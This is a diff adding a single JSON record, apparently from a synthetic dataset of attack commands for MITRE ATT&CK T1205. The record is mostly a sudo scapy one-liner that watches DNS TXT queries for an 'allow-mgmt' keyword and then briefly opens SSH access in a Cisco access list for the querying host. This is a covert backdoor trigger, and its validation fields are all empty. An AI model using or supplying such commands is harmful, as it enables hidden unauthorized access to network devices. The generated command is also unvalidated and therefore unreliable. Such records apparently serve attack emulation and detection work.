@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1205",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "sudo python3 -c 'from scapy.all import sniff,IP,UDP,DNS,DNSQR; import os; p=sniff(filter=\"udp dst port 53\", lfilter=lambda x: x.haslayer(DNS) and x[DNS].qd and x[DNS].qd.qtype==16 and b\"allow-mgmt\" in x[DNSQR].qname, count=1)[0]; os.system(f\"ciscoconf --apply \\\"ip access-list extended MGMT-DNS; permit tcp host {p[IP].src} any eq 22\\\" && (sleep 180; ciscoconf --apply \\\"ip access-list extended MGMT-DNS; no permit tcp host {p[IP].src} any eq 22\\\") &\")'",
+  "explanation": "Uses a covert DNS TXT query containing 'allow-mgmt' as a signal to open SSH for 3 minutes to the querying IP via ciscoconf. Requires sudo for packet capture.",
+  "rationale_steps": [
+    "Sniff DNS TXT requests and detect a keyword-based trigger (covert signal).",
+    "Temporarily permit SSH from the source IP and automatically revoke after 180s.",
+    "Avoids changing credentials; only ACLs are manipulated.",
+    "Detection: inspect DNS logs for anomalous TXT queries and correlate with ACL changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-7a393370-14a1e395",
+  "source_prompt_hash": "7a393370",
+  "timestamp_utc": "2025-09-30T06:01:37.763989Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
